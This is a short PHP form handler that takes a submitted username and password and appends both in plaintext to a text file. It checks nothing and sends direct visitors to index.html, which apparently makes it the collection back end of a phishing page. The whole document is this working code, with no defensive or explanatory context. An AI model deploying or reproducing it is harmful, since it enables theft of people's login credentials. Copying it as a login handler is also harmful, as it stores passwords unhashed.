<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Open a file to save the data
    $file_path = '/user_data.txt';
    $file = fopen($file_path, "a"); // "a" means append to the file
    if ($file) {
        // Write the username and password to the file
        fwrite($file, "Username: $username, Password: $password\n");
        fclose($file);
        
    } else {
        echo "Error: Unable to open file.";
    }
} else {
    // Redirect users who try to access this page directly
    header("Location: index.html");
    exit();
}
?>

